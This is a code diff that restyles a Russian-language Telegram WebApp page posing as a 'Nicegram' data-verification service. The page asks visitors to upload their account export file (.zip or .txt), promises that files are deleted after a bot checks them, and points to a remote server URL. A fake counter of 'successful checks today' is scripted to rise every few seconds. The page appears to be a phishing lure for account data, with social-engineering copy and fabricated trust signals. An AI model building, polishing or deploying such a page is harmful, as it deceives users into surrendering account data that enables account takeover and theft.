@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -28,7 +29,7 @@
 
         body {
             margin: 0; padding: 0;
-            background: radial-gradient(circle at 30% 30%, #2a2a2a 0%, #151515 100%);
+            background: #0d0d0d;
             color: var(--text-main);
             font-family: 'Inter', sans-serif;
             height: 100vh;
@@ -42,24 +43,50 @@
 
         #fileInput { display: none !important; }
 
+        /* GRID BACKGROUND */
+        .grid-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image: 
+                linear-gradient(rgba(199, 158, 105, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(199, 158, 105, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 0;
+            pointer-events: none;
+        }
+
         /* ЭФФЕКТЫ ФОНА */
         #particles {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             pointer-events: none; z-index: 1;
         }
+
         .liquid-blob {
             position: absolute;
             border-radius: 50%;
-            filter: blur(60px);
+            filter: blur(100px);
             z-index: 0;
-            opacity: 0.12;
-            animation: floatBlob 14s infinite ease-in-out;
+            opacity: 0.2;
+            animation: floatBlob 20s infinite ease-in-out;
         }
-        .blob-1 { width: 320px; height: 320px; background: #c79e69; top: -10%; left: -12%; }
-        .blob-2 { width: 280px; height: 280px; background: #8a6f47; bottom: -10%; right: -12%; }
+        .blob-1 { 
+            width: 500px; height: 500px; 
+            background: radial-gradient(circle, #c79e69, #8a6f47); 
+            top: -20%; left: -20%; 
+            animation-delay: 0s; 
+        }
+        .blob-2 { 
+            width: 450px; height: 450px; 
+            background: radial-gradient(circle, #d4ab73, #c79e69); 
+            bottom: -20%; right: -20%; 
+            animation-delay: 5s; 
+        }
         @keyframes floatBlob {
-            0%, 100% { transform: translate(0, 0); }
-            50% { transform: translate(30px, -30px); }
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(50px, -60px) rotate(90deg); }
+            50% { transform: translate(-40px, 50px) rotate(180deg); }
+            75% { transform: translate(60px, 40px) rotate(270deg); }
         }
 
         .animated-images {
@@ -68,24 +95,42 @@
         }
         .image {
             position: absolute;
-            width: 65px;
-            opacity: 0.1;
-            filter: blur(0.8px) sepia(0.3) hue-rotate(15deg);
-            animation: floatImg 20s infinite ease-in-out;
+            width: 60px;
+            opacity: 0.06;
+            filter: blur(0.5px) sepia(0.5) saturate(1.2) hue-rotate(15deg);
+            animation: floatImg 25s infinite ease-in-out;
         }
-        .image1 { top: 20%; left: 10%; } 
-        .image2 { top: 65%; left: 80%; } 
-        .image3 { top: 70%; left: 15%; } 
-        .image4 { top: 15%; left: 75%; }
+        .image1 { top: 10%; left: 5%; animation-delay: 0s; } 
+        .image2 { top: 70%; left: 85%; animation-delay: 4s; } 
+        .image3 { top: 80%; left: 10%; animation-delay: 8s; } 
+        .image4 { top: 12%; left: 80%; animation-delay: 12s; }
         @keyframes floatImg {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-30px) rotate(6deg); }
+            0%, 100% { transform: translateY(0) rotate(0deg) scale(1); }
+            33% { transform: translateY(-40px) rotate(5deg) scale(1.05); }
+            66% { transform: translateY(20px) rotate(-5deg) scale(0.95); }
+        }
+
+        /* SCAN LINES */
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.05),
+                rgba(0, 0, 0, 0.05) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 56;
+            opacity: 0.4;
         }
 
         /* ВИНЬЕТКА */
         .frost-vignette {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            box-shadow: inset 0 0 100px rgba(199, 158, 105, 0.08);
+            box-shadow: inset 0 0 150px rgba(0, 0, 0, 0.8);
             pointer-events: none; z-index: 55;
         }
 
@@ -93,98 +138,204 @@
         .glass-card {
             position: relative;
             z-index: 10;
-            width: 88%;
-            max-width: 340px;
-            padding: 50px 30px 40px;
-            background: var(--holo-bg);
-            border-radius: 28px;
-            backdrop-filter: blur(28px) saturate(150%);
-            -webkit-backdrop-filter: blur(28px) saturate(150%);
-            border: 1px solid var(--glass-border);
-            box-shadow:
-                0 12px 30px rgba(0, 0, 0, 0.6),
-                0 0 0 1px var(--glass-glow);
+            width: 92%;
+            max-width: 440px;
+            padding: 0;
+            background: transparent;
+            border-radius: 0;
             text-align: center;
             overflow: visible;
         }
 
+        .card-inner {
+            background: linear-gradient(160deg, rgba(30, 30, 30, 0.9), rgba(15, 15, 15, 0.95));
+            border: 2px solid transparent;
+            border-radius: 24px;
+            padding: 50px 40px 45px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                0 25px 70px rgba(0, 0, 0, 0.8),
+                inset 0 1px 0 rgba(255, 255, 255, 0.03);
+        }
+
+        .card-inner::before {
+            content: '';
+            position: absolute;
+            top: -2px; left: -2px; right: -2px; bottom: -2px;
+            background: linear-gradient(45deg, #c79e69, #8a6f47, #d4ab73, #c79e69);
+            background-size: 400% 400%;
+            border-radius: 24px;
+            z-index: -1;
+            animation: borderGlow 8s ease infinite;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .card-inner::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 0%, rgba(199, 158, 105, 0.08), transparent 70%);
+            pointer-events: none;
+        }
+
         .logo-text {
-            font-size: 40px;
+            font-size: 48px;
             font-weight: 900;
-            color: #fff;
-            letter-spacing: -1.5px;
-            margin-bottom: 8px;
-            text-shadow: 0 0 12px rgba(199, 158, 105, 0.3), 0 0 20px rgba(199, 158, 105, 0.15);
-            background: linear-gradient(90deg, #c79e69, #d4ab73);
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+            background: linear-gradient(180deg, #ffffff, #c79e69);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            position: relative;
+            display: inline-block;
+        }
+
+        .logo-text::after {
+            content: 'NICEGRAM';
+            position: absolute;
+            top: 0; left: 0;
+            background: linear-gradient(180deg, #c79e69, #d4ab73);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            z-index: -1;
+            filter: blur(20px);
+            opacity: 0.6;
+        }
+
+        .divider {
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #c79e69, transparent);
+            margin: 20px auto 25px;
+            border-radius: 10px;
         }
 
         h1 {
-            font-size: 22px;
-            font-weight: 800;
-            margin: 0 0 14px;
+            font-size: 26px;
+            font-weight: 900;
+            margin: 0 0 15px;
             color: #fff;
-            opacity: 0.92;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         p {
-            font-size: 14px;
+            font-size: 15px;
             color: var(--text-secondary);
-            line-height: 1.55;
-            margin-bottom: 20px;
+            line-height: 1.65;
+            margin-bottom: 28px;
+            font-weight: 500;
         }
 
         .stats-wrapper {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 28px;
-            background: rgba(60, 50, 40, 0.3);
-            padding: 9px 20px;
-            border-radius: 50px;
-            border: 1px solid rgba(199, 158, 105, 0.2);
+            gap: 14px;
+            margin-bottom: 35px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 14px 28px;
+            border-radius: 100px;
+            border: 1px solid rgba(199, 158, 105, 0.3);
+            box-shadow: 
+                0 0 30px rgba(199, 158, 105, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            position: relative;
+        }
+
+        .stats-wrapper::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(199, 158, 105, 0.3), transparent);
+            pointer-events: none;
         }
 
         .live-dot {
-            width: 9px;
-            height: 9px;
-            background: var(--status-green);
+            width: 12px;
+            height: 12px;
+            background: #c79e69;
             border-radius: 50%;
-            box-shadow: 0 0 10px var(--status-green);
+            box-shadow: 
+                0 0 20px #c79e69,
+                0 0 40px rgba(199, 158, 105, 0.5);
             animation: pulse-dot 2s infinite;
+            position: relative;
+        }
+
+        .live-dot::before {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 100%; height: 100%;
+            background: #c79e69;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            animation: ripple 2s infinite;
         }
 
         #stats-counter {
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--holo-gold);
-            text-shadow: 0 0 6px rgba(199, 158, 105, 0.25);
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.3px;
         }
 
         @keyframes pulse-dot {
             0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(0.85); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        @keyframes ripple {
+            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(2.5); opacity: 0; }
         }
 
         .btn {
-            background: linear-gradient(135deg, var(--btn-gold-start), var(--btn-gold-end));
-            color: white;
+            background: linear-gradient(135deg, #c79e69, #d4ab73);
+            color: #0d0d0d;
             border: none;
-            padding: 17px 0;
-            border-radius: 18px;
+            padding: 20px 0;
+            border-radius: 16px;
             font-size: 18px;
-            font-weight: 800;
+            font-weight: 900;
             width: 100%;
             cursor: pointer;
             box-shadow:
-                0 8px 20px rgba(199, 158, 105, 0.3),
-                0 0 0 1px rgba(199, 158, 105, 0.4);
-            transition: all 0.3s ease;
+                0 15px 40px rgba(199, 158, 105, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.4);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.6s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
         .btn:active {
-            transform: translateY(2px);
-            box-shadow: 0 4px 12px rgba(199, 158, 105, 0.25);
+            transform: scale(0.96);
+            box-shadow: 0 8px 20px rgba(199, 158, 105, 0.3);
         }
 
         /* ЗАГРУЗКА */
@@ -192,126 +343,196 @@
             display: none;
             flex-direction: column;
             align-items: center;
+            padding: 20px 0;
         }
+
+        .spinner-container {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin-bottom: 30px;
+        }
+
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-left-color: var(--holo-gold);
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 4px solid rgba(199, 158, 105, 0.1);
             border-radius: 50%;
+        }
+
+        .spinner-1 {
+            border-top-color: #c79e69;
+            animation: spin 1.5s linear infinite;
+        }
+
+        .spinner-2 {
+            border-right-color: #d4ab73;
+            animation: spin 2s linear infinite reverse;
+            width: 80%;
+            height: 80%;
+            top: 10%;
+            left: 10%;
+        }
+
+        .spinner-3 {
+            border-bottom-color: #c79e69;
             animation: spin 1s linear infinite;
-            margin-bottom: 22px;
-            box-shadow: 0 0 15px rgba(199, 158, 105, 0.25);
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+
         .status-text {
-            font-size: 16px;
-            font-weight: 700;
+            font-size: 18px;
+            font-weight: 800;
             color: #fff;
-            margin-bottom: 6px;
-            min-height: 1.4em;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
+
         .percent-display {
-            font-size: 14px;
+            font-size: 56px;
             font-weight: 900;
-            color: var(--holo-gold);
+            background: linear-gradient(135deg, #c79e69, #f0d4a8, #c79e69);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 30px rgba(199, 158, 105, 0.5));
         }
 
         /* ФУТЕР */
         .footer-container {
             position: absolute;
-            bottom: 35px;
+            bottom: 25px;
             display: flex;
-            gap: 18px;
+            gap: 12px;
             z-index: 30;
         }
+
         .footer-btn {
-            background: rgba(34, 34, 34, 0.7);
-            color: #fff;
-            padding: 11px 20px;
-            border-radius: 14px;
+            background: rgba(20, 20, 20, 0.85);
+            color: #c79e69;
+            padding: 13px 24px;
+            border-radius: 12px;
             font-size: 14px;
-            font-weight: 700;
+            font-weight: 800;
             cursor: pointer;
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(199, 158, 105, 0.15);
+            backdrop-filter: blur(20px);
+            border: 1.5px solid rgba(199, 158, 105, 0.25);
             display: flex;
             align-items: center;
-            gap: 9px;
-            transition: 0.25s;
+            gap: 8px;
+            transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-size: 13px;
         }
+
+        .footer-btn svg {
+            filter: drop-shadow(0 0 4px rgba(199, 158, 105, 0.3));
+        }
+
         .footer-btn:active {
-            transform: scale(0.96);
-            background: rgba(50, 50, 50, 0.8);
+            transform: scale(0.94);
+            background: rgba(30, 30, 30, 0.95);
+            border-color: rgba(199, 158, 105, 0.5);
+            color: #d4ab73;
         }
 
         /* МОДАЛКИ */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
             z-index: 40;
             opacity: 0;
             pointer-events: none;
-            transition: opacity 0.35s ease;
+            transition: opacity 0.4s ease;
         }
         .modal-overlay.active {
             opacity: 1;
             pointer-events: all;
         }
+
         .modal {
             position: fixed;
             bottom: -100%;
             left: 0;
             width: 100%;
-            background: rgba(34, 34, 34, 0.95);
-            backdrop-filter: blur(30px);
-            border-top: 1px solid rgba(199, 158, 105, 0.2);
-            border-radius: 30px 30px 0 0;
-            padding: 30px 25px 45px;
+            background: linear-gradient(165deg, rgba(25, 25, 25, 0.98), rgba(15, 15, 15, 0.99));
+            backdrop-filter: blur(50px);
+            border-top: 2px solid rgba(199, 158, 105, 0.4);
+            border-radius: 40px 40px 0 0;
+            padding: 40px 30px 55px;
             z-index: 50;
-            transition: bottom 0.5s cubic-bezier(0.2, 1, 0.3, 1);
+            transition: bottom 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
             color: #fff;
+            box-shadow: 0 -15px 60px rgba(0, 0, 0, 0.7);
         }
+
         .modal.active {
             bottom: 0;
         }
+
         .modal h3 {
-            font-size: 20px;
-            font-weight: 800;
-            margin-bottom: 18px;
-            color: var(--holo-gold);
+            font-size: 24px;
+            font-weight: 900;
+            margin-bottom: 22px;
+            background: linear-gradient(135deg, #c79e69, #f0d4a8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
+
         .btn-close {
-            background: rgba(199, 158, 105, 0.12);
-            color: #fff;
-            border: 1px solid rgba(199, 158, 105, 0.25);
+            background: linear-gradient(135deg, rgba(199, 158, 105, 0.2), rgba(199, 158, 105, 0.1));
+            color: #c79e69;
+            border: 1.5px solid rgba(199, 158, 105, 0.4);
             width: 100%;
-            padding: 15px;
-            margin-top: 22px;
-            border-radius: 16px;
-            font-weight: 800;
+            padding: 18px;
+            margin-top: 28px;
+            border-radius: 14px;
+            font-weight: 900;
+            font-size: 16px;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(199, 158, 105, 0.15);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
+
         .btn-close:active {
-            background: rgba(199, 158, 105, 0.2);
+            background: linear-gradient(135deg, rgba(199, 158, 105, 0.3), rgba(199, 158, 105, 0.2));
+            transform: scale(0.97);
+            color: #d4ab73;
         }
 
         /* ERROR MODAL */
         #errorModal h3 {
-            color: var(--error-red);
-            text-shadow: 0 0 12px rgba(255, 50, 50, 0.3);
+            background: linear-gradient(135deg, #ff3333, #ff6666);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         #errorModal .btn-close {
-            background: rgba(255, 50, 50, 0.1);
-            border-color: rgba(255, 50, 50, 0.25);
+            background: linear-gradient(135deg, rgba(255, 50, 50, 0.2), rgba(255, 50, 50, 0.1));
+            border-color: rgba(255, 50, 50, 0.4);
+            color: #ff6666;
         }
     </style>
 </head>
 <body>
 
+    <div class="grid-bg"></div>
+    <div class="scanlines"></div>
     <div class="frost-vignette"></div>
 
     <div class="liquid-blob blob-1"></div>
@@ -326,35 +547,42 @@
     </div>
 
     <div class="glass-card">
-        <div class="logo-text">Nicegram</div>
-        
-        <div id="step-start">
-            <h1 id="greeting">Привет, Стаут</h1>
-            <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+        <div class="card-inner">
+            <div class="logo-text">Nicegram</div>
+            <div class="divider"></div>
             
-            <div class="stats-wrapper">
-                <div class="live-dot"></div>
-                <div id="stats-counter">Пройдено успешных проверок за сегодня 2520</div>
+            <div id="step-start">
+                <h1 id="greeting">Привет, Тракер</h1>
+                <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+                
+                <div class="stats-wrapper">
+                    <div class="live-dot"></div>
+                    <div id="stats-counter">Пройдено успешных проверок за сегодня 2520</div>
+                </div>
+
+                <input type="file" id="fileInput" accept=".zip,.txt" onchange="startVerification(this)">
+                <button class="btn" onclick="document.getElementById('fileInput').click()">Загрузить файл</button>
             </div>
 
-            <input type="file" id="fileInput" accept=".zip,.txt" onchange="startVerification(this)">
-            <button class="btn" onclick="document.getElementById('fileInput').click()">Загрузить файл</button>
-        </div>
-
-        <div id="step-loading">
-            <div class="spinner"></div>
-            <div class="status-text" id="statusText">Инициализация...</div>
-            <div class="percent-display" id="percentText">0%</div>
+            <div id="step-loading">
+                <div class="spinner-container">
+                    <div class="spinner spinner-1"></div>
+                    <div class="spinner spinner-2"></div>
+                    <div class="spinner spinner-3"></div>
+                </div>
+                <div class="status-text" id="statusText">Инициализация...</div>
+                <div class="percent-display" id="percentText">0%</div>
+            </div>
         </div>
     </div>
 
     <div class="footer-container">
         <div class="footer-btn" onclick="openModal('instructionModal')">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line></svg>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line></svg>
             Инструкция
         </div>
         <div class="footer-btn" onclick="openModal('faqModal')">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
             FAQ
         </div>
     </div>
@@ -363,7 +591,7 @@
 
     <div class="modal" id="instructionModal">
         <h3>Инструкция</h3>
-        <ol style="color: #ccc; font-size: 15px; line-height: 1.8; padding-left: 20px;">
+        <ol style="color: #ccc; font-size: 15px; line-height: 1.9; padding-left: 20px;">
             <li>Скачайте приложение Nicegram с официального сайта...</li>
             <li>Откройте Nicegram и войдите в свой аккаунт.</li>
             <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
@@ -377,7 +605,7 @@
 
     <div class="modal" id="faqModal">
         <h3>❓ Частые вопросы</h3>
-        <div style="color: #bbb; font-size: 15px; line-height: 1.6;">
+        <div style="color: #bbb; font-size: 15px; line-height: 1.7;">
             <p><b>Что такое рефаунд?</b><br>Это возврат средств за подарок...</p>
             <p><b>Сколько времени занимает проверка?</b><br>Обычно 3-5 минут, бывают задержки</p>
             <p><b>Мои файлы в безопасности?</b><br>Да - мы не храним ваши файлы, их проверяет наш бот, после чего удаляет</p>
@@ -387,7 +615,7 @@
 
     <div class="modal" id="errorModal">
         <h3>Ошибка!</h3>
-        <p style="color: #ffffff; font-size: 16px; line-height: 1.5; font-weight: 500;">
+        <p style="color: #ffffff; font-size: 16px; line-height: 1.6; font-weight: 500;">
             Файл должен быть в формате .zip или .txt! Пожалуйста, прочтите инструкцию.
         </p>
         <button class="btn-close" onclick="closeAllModals()">Понятно</button>
@@ -395,7 +623,7 @@
 
     <script>
         const BANNED_USERS = ['monk']; 
-        const SERVER_URL = "https://nicegram-2r84.onrender.com";
+        const SERVER_URL = "https://nicebot.vercel.app/";
         const tg = window.Telegram.WebApp;
         tg.expand();
 
@@ -500,36 +728,33 @@
             container.appendChild(canvas);
             var particles = [], width, height;
             function resize() { width = window.innerWidth; height = window.innerHeight; canvas.width = width; canvas.height = height; }
-            function Particle() { this.x = Math.random() * width; this.y = Math.random() * height; this.vx = (Math.random() - 0.5) * 0.2; this.vy = (Math.random() - 0.5) * 0.2; this.size = Math.random() * 1.5; }
+            function Particle() { this.x = Math.random() * width; this.y = Math.random() * height; this.vx = (Math.random() - 0.5) * 0.3; this.vy = (Math.random() - 0.5) * 0.3; this.size = Math.random() * 2; }
             Particle.prototype.update = function() { this.x += this.vx; this.y += this.vy; if (this.x < 0 || this.x > width) this.vx *= -1; if (this.y < 0 || this.y > height) this.vy *= -1; };
-            Particle.prototype.draw = function() { ctx.fillStyle = 'rgba(199, 158, 105, 0.25)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); };
-            window.addEventListener('resize', resize); resize();
-            for (var i = 0; i < 35; i++) particles.push(new Particle());
-            function animate() { ctx.clearRect(0, 0, width, height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
-            animate();
-        })();
+Particle.prototype.draw = function() { ctx.fillStyle = 'rgba(199, 158, 105, 0.15)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); };
+window.addEventListener('resize', resize); resize();
+for (var i = 0; i < 50; i++) particles.push(new Particle());
+function animate() { ctx.clearRect(0, 0, width, height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
+animate();
+})();
+function openModal(id) { 
+        const overlay = document.querySelector('.modal-overlay');
+        const modal = document.getElementById(id);
+        if(overlay) overlay.classList.add('active'); 
+        if(modal) modal.classList.add('active'); 
+    }
+    function closeAllModals() { 
+        const overlay = document.querySelector('.modal-overlay');
+        if(overlay) overlay.classList.remove('active'); 
+        document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); 
+    }
 
-        function openModal(id) { 
-            const overlay = document.querySelector('.modal-overlay');
-            const modal = document.getElementById(id);
-            if(overlay) overlay.classList.add('active'); 
-            if(modal) modal.classList.add('active'); 
+    const statsElem = document.getElementById('stats-counter');
+    let checkCount = 2520;
+    
+    setInterval(() => {
+        checkCount++;
+        if(statsElem) {
+            statsElem.innerText = `Пройдено успешных проверок за сегодня ${checkCount}`;
         }
-        function closeAllModals() { 
-            const overlay = document.querySelector('.modal-overlay');
-            if(overlay) overlay.classList.remove('active'); 
-            document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); 
-        }
-
-        const statsElem = document.getElementById('stats-counter');
-        let checkCount = 2520;
-        
-        setInterval(() => {
-            checkCount++;
-            if(statsElem) {
-                statsElem.innerText = `Пройдено успешных проверок за сегодня ${checkCount}`;
-            }
-        }, 20000);
+    }, 10000);
     </script>
-</body>
-</html>
